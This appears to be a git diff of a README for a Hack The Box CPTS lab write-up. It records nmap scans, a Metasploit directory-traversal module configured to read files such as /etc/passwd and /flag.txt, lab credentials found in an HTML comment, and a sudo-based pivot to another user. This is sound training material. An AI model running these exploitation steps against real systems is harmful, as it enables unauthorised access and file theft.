@@ -1,241 +1,145 @@
-# Hack The Box CPTS
+# 🏴 Hack The Box — CPTS Certification Journey
 
-Me and a hacker have decided to go for our Hack The Box CPTS certification. Welcome to our journey
+Two hackers working toward the **Hack The Box Certified Penetration Testing Specialist (CPTS)** certification. This repo documents our progress, methodology, and flags along the way.
 
+---
 
-## Section 8 Service Scanning box
+## 📦 Section 8 — Service Scanning
 
-Flag: Try to identify the services running on the server above, and then try to search to find public exploits to exploit them. Once you do, try to get the content of the '/flag.txt' file. (note: the web server may take a few seconds to start)
+> **Objective:** Identify services running on the target, find public exploits, and retrieve `/flag.txt`.
 
+### Reconnaissance
 
-### Service Enumeration
-IP: http://154.57.164.72:31179/
+**Target:** `http://154.57.164.72:31179/`
 
-Navigating to that IP/port shows us the following:
+Navigating to the target reveals an information disclosure — one of the most common (and favorite) pentest findings:
 
-![alt text](images/section8box.png)
+![Service Scanning - Information Disclosure](images/section8box.png)
 
+The exposed version info points us toward a known WordPress vulnerability. Using AI-assisted research, I identify the relevant Metasploit module:
 
-Nice information disclosure, one of my favorite and most common pentest findings. I use AI to find the `auxiliary/scanner/http/wp_simple_backup_file_read` metasploit module
+```
+auxiliary/scanner/http/wp_simple_backup_file_read
+```
 
+### Exploitation via Metasploit
 
-### metasploit
+```bash
+msf > use auxiliary/scanner/http/wp_simple_backup_file_read
+msf > set RHOSTS 154.57.164.72
+msf > set RPORT 31179
+msf > set FILEPATH /flag.txt
+msf > run
 
-~~~
-msf auxiliary(scanner/http/wordpress_scanner) > use auxiliary/scanner/http/wp_simple_backup_file_read
-msf auxiliary(scanner/http/wp_simple_backup_file_read) > options
-
-Module options (auxiliary/scanner/http/wp_simple_backup_file_read):
-
-   Name       Current Setting  Required  Description
-   ----       ---------------  --------  -----------
-   DEPTH      6                yes       Traversal Depth (to reach the root folder)
-   FILEPATH   /etc/passwd      yes       The path to the file to read
-   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]. Supported proxies: sapni, http, socks4, socks5,
-                                          socks5h
-   RHOSTS     154.57.164.72    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
-   RPORT      31179            yes       The target port (TCP)
-   SSL        false            no        Negotiate SSL/TLS for outgoing connections
-   TARGETURI  /                yes       The base path to the wordpress application
-   THREADS    1                yes       The number of concurrent threads (max one per host)
-   VHOST                       no        HTTP server virtual host
-
-
-View the full module info with the info, or info -d command.
-
-msf auxiliary(scanner/http/wp_simple_backup_file_read) > set FILEPATH /flag.txt
-FILEPATH => /flag.txt
-msf auxiliary(scanner/http/wp_simple_backup_file_read) > run
 [+] File saved in: /Users/sil3nt/.msf4/loot/20260513102116_default_154.57.164.72_simplebackup.tra_561948.txt
 [*] Scanned 1 of 1 hosts (100% complete)
 [*] Auxiliary module execution completed
-msf auxiliary(scanner/http/wp_simple_backup_file_read) > cat /Users/sil3nt/.msf4/loot/20260513102116_default_154.57.164.72_simplebackup.tra_561948.txt
-[*] exec: cat /Users/sil3nt/.msf4/loot/20260513102116_default_154.57.164.72_simplebackup.tra_561948.txt
+```
+
+```bash
+msf > cat /Users/sil3nt/.msf4/loot/20260513102116_default_154.57.164.72_simplebackup.tra_561948.txt
 
 HTB{REDACTED}
-~~~
+```
 
-Done :) 
+✅ **Flag captured.**
 
-## Section 9 Web Enumeration
+---
 
-This section talked about finding public exploits by google *technology name* + exploit. It also talked about searchsploit and metasploit. 
+## 🌐 Section 9 — Web Enumeration
 
+> **Objective:** Identify services, find public exploits, and retrieve `/flag.txt`.
 
-_Flag: Try to identify the services running on the server above, and then try to search to find public exploits to exploit them. Once you do, try to get the content of the '/flag.txt' file. (note: the web server may take a few seconds to start)_
+This section covers finding public exploits via Google dorking (`<technology> + exploit`), Searchsploit, and Metasploit.
 
+### Nmap Scan
 
-### nmap 
-~~~
-➜  ~ nmap -sV -p 30764 154.57.164.63
-Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-13 14:04 -0600
-Nmap scan report for 154-57-164-63.static.isp.htb.systems (154.57.164.63)
-Host is up (0.078s latency).
+```bash
+nmap -sV -p 30764 154.57.164.63
+```
 
+```
 PORT      STATE SERVICE VERSION
 30764/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
-~~~
+```
 
-Going to the web server, I get greeted with this 
+### Web Server Exploration
 
-![alt text](images/Section9.png)
+Visiting the target shows a simple landing page:
 
-I inspect the webpage:
+![Web Enumeration - Landing Page](images/Section9.png)
 
-~~~</html>
-<!DOCTYPE html>
+The page source is a basic HTML page with no interesting content — just a styled "Welcome to HTB Academy Blog" heading.
 
-<head>
-    <title>HTB Academy</title>
-    <style>
-        *,
-        html {
-            margin: 0;
-            padding: 0;
-            border: 0;
-        }
+### Discovering Hidden Pages
 
-        html {
-            width: 100%;
-            height: 100%;
-        }
-
-        body {
-            width: 100%;
-            height: 100%;
-            position: relative;
-            background-color: rgb(42, 48, 66);
-        }
-
-        .center {
-            width: 100%;
-            height: 50%;
-            margin: 0;
-            position: absolute;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            color: white;
-            font-family: "Helvetica", Helvetica, sans-serif;
-            text-align: center;
-        }
-
-        h1 {
-            font-size: 144px;
-        }
-
-        p {
-            font-size: 64px;
-        }
-    </style>
-</head>
-
-<body>
-    <div class="center">
-        <h1>Welcome to HTB Academy Blog</h1>
-    </div>
-</body>
-
-</html>
-~~~
-
-
-I try `robots.txt`:
-
-http://154.57.164.63:30764/robots.txt
+Checking `robots.txt` at `http://154.57.164.63:30764/robots.txt`:
 
 ```
 User-agent: *
 Disallow: /admin-login-page.php
-````
+```
 
-You disallow robots, but not humans; lets check it out
+You disallow robots, but not humans — let's check it out.
 
-![alt text](images/2.png)
+![Admin Login Page](images/2.png)
 
-View page source:
+### Source Code Analysis
 
-~~~
-<!DOCTYPE html>
-<html>
-<style>
-    body {
-        background-color: #151D2B;
-    }
+Inspecting the login page source reveals hardcoded credentials in an HTML comment:
 
-    form {
-        background-color: #1A2332;
-        width: 25%;
-        margin: auto;
-        border-radius: 10px;
-        color: white;
-        font-family: Arial, Helvetica, sans-serif;
-    }
+```html
+<!-- TODO: remove test credentials admin:password123 -->
+```
 
-    input[type=text],
-    input[type=password] {
-        background-color: #101927;
-        width: 100%;
-        padding: 12px 20px;
-        margin: 8px 0;
-        display: inline-block;
-        border: 1px solid #101927;
-        box-sizing: border-box;
-        border-radius: 10px;
-        color: white;
-    }
+✅ **Flag:** `HTB{REDACTED}`
 
-    button {
-        background-color: #2A86FF;
-        color: white;
-        padding: 14px 20px;
-        margin: 8px 0;
-        border: none;
-        cursor: pointer;
-        width: 100%;
-        border-radius: 10px;
-    }
+---
 
-    button:hover {
-        opacity: 0.8;
-    }
+## 🔐 Section 11 — Privilege Escalation
 
-    .container {
-        padding: 16px;
-    }
-</style>
+> **Objective:** SSH into the server, pivot to `user2`, and retrieve `/home/user2/flag.txt`.
 
-<body>
-                <form name='login' autocomplete='off' class='form' action='' method='post'>
-            <div class='control'>
-                <h1>
-                    Admin Panel
-                </h1>
-            </div>
-            <div class="container">
-                <label for="username"><b>Username</b></label>
-                <input name='username' placeholder='Username' type='text'>
+### Reconnaissance
 
-                <label for="password"><b>Password</b></label>
-                <input name='password' placeholder='Password' type='password'>
+```bash
+nmap -sV -Pn 154.57.164.64
+```
 
-                <!-- TODO: remove test credentials admin:password123 -->
+```
+PORT   STATE SERVICE VERSION
+53/tcp open  domain?
+```
 
-                <button type="submit" formmethod='post'>Login</button>
-            </div>
-        </form>
-    </body>
+### Initial Access
 
-</html>
-~~~
+SSH in as `user1` on the provided port:
 
-Flag: HTB{REDACTED}
+```bash
+ssh -p 30798 user1@154.57.164.64
+```
 
-## Section 11 
+### Privilege Enumeration
 
-_Flag1: SSH into the server above with the provided credentials, and use the '-p xxxxxx' to specify the port shown above. Once you login, try to find a way to move to 'user2', to get the flag in '/home/user2/flag.txt'._
+Checking what `user1` can run with elevated privileges:
 
+```bash
+user1@host:~$ sudo -l
+```
 
+```
+User user1 may run the following commands:
+    (user2 : user2) NOPASSWD: /bin/bash
+```
 
+`user1` can run `/bin/bash` as `user2` without a password — easy lateral move.
 
+### Lateral Movement
 
+```bash
+user1@host:~$ sudo -u user2 /bin/bash
+user2@host:~$ cat /home/user2/flag.txt
+HTB{REDACTED}
+```
+
+✅ **Flag captured.**
